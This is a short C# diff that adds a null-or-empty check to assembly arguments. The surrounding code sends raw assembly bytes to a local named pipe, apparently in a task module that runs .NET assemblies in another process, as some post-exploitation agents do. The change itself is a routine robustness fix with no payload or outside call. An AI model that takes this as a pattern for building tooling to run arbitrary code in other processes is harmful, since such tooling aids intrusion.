@@ -153,7 +153,7 @@ namespace Tasks
                                         IPCCommandArguments cmdargs = new IPCCommandArguments
                                         {
                                             ByteData = assemblyBytes,
-                                            StringData = parameters.AssemblyArguments
+                                            StringData = string.IsNullOrEmpty(parameters.AssemblyArguments) ? "" : parameters.AssemblyArguments,
                                         };
                                         AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                         client.ConnectionEstablished += Client_ConnectionEstablished;
